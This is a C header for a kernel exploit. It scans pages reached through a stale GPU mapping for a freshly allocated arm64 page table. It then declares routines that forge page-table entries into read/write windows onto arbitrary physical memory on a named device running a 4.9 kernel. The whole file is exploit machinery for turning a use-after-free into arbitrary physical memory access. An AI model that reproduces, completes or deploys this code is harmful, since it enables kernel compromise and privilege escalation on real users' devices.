/* Scanner for arm64 page-table pages read through a stale 36449 mapping.
 *
 * Target: a level-3 (leaf) PTE table of a 39-bit-VA arm64 kernel (4.9,
 * the Station's config), freshly allocated for a compat process that
 * faulted K marker pages at the start of a 2MB block.  PGALLOC_GFP
 * zeroes the page, so a fresh table is all zeros except K entries at
 * indices 0..K-1 - a strong signature against reclaimed-user-data pages.
 *
 * Host-testable: plain C99, no kernel or Mali headers.
 */
#ifndef RECLAIM_SCAN_H
#define RECLAIM_SCAN_H

#include <stdint.h>

#define RS_ENTRIES 512
/* Real arm64 PTEs carry flag bits well above the PA (DBM=51, PXN=53,
 * UXN=54...).  PA bits for this class of SoC are 12..38; bits >= 39 are
 * flags/reserved and must NOT be treated as part of the address. */
#define RS_PA_MASK 0x0000007FFFFFF000ULL
#define RS_FLAG_BITS 0xFFFFFFFF80000000ULL

/* Duo Max: ~3 GB RAM, so allow plausible PAs below 0xC0000000. */
#define RS_PA_MAX 0xC0000000ULL

struct rs_result {
	int n_valid;              /* entries with bit0 set */
	int idx_first, idx_last;  /* span of valid entries */
	int contiguous;           /* valid entries form one run */
	int attrs_consistent;     /* all valid entries share low 12 bits */
	uint32_t attr_common;     /* those low 12 bits (0 if none) */
	int pas_plausible;        /* all PAs page-aligned, nonzero, < RS_PA_MAX */
	int pas_distinct;         /* no two valid entries share a PA */
};

/* Fill *out with the structural summary of a 4 KB page image. */
void rs_analyze(const uint64_t *page, struct rs_result *out);

/* Decide whether the page is a fresh marker PTE table: exactly k valid
 * entries, contiguous run starting at first_idx, consistent attributes,
 * plausible distinct PAs, and everything else zero.  Returns 1 on match. */
int rs_is_marker_table(const uint64_t *page, int k, int first_idx,
		       struct rs_result *out);

/* ---- stage 2: R/W windows through the stale-owned table ---- */

/* Build a window descriptor: keep attrs/flags of a live user-data entry,
 * replace the PA field (bits 12..38) with target_pa. */
uint64_t pt_build_window(uint64_t live_entry, uint64_t target_pa);

/* Window targets: nonzero, 4K-aligned, inside RAM. */
int pt_target_ok(uint64_t pa);

/* A window may only be installed into an entry that is exactly zero
 * (not merely invalid): keeps close semantics and BBM rules simple. */
int pt_idx_usable(const uint64_t *table, int idx);

/* Tear-safe install/close for a 32-bit CPU writing 64-bit entries:
 * install writes the HIGH word first (entry stays invalid), then the
 * LOW word last as one atomic 32-bit store that sets valid|PA|attrs;
 * close clears the LOW word first (atomic invalidation), then the high.
 * A page-table walker therefore never observes a half-written entry
 * with the valid bit set. */
void pt_install_window(volatile uint64_t *entry, uint64_t w);
void pt_close_window(volatile uint64_t *entry);

#endif
